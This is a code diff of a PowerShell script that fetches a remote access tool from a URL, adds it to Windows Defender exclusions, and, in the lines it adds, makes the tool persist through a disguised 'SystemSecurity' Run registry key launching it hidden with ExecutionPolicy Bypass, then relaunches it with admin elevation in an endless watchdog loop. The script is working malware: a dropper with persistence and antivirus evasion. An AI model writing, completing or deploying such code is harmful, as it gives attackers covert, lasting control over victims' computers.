@@ -10,10 +10,26 @@ Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
 
 Add-MpPreference -ExclusionProcess $ratPath
 
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "SystemSecurity"
+$regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ratPath`""
+
+if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
+}
+
+function Run-AsAdmin {
+    $process = New-Object System.Diagnostics.ProcessStartInfo
+    $process.FileName = $ratPath
+    $process.Verb = "runas"
+    $process.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($process)
+}
+
 while ($true) {
     if (-not (Get-Process -Name "macro" -ErrorAction SilentlyContinue)) {
-        Start-Process -FilePath $ratPath   # Chạy bình thường
-        Start-Process -FilePath $ratPath -Verb RunAs  # Chạy với quyền admin
+        Start-Process -FilePath $ratPath
+        Run-AsAdmin
     }
     Start-Sleep -Seconds 32
 }
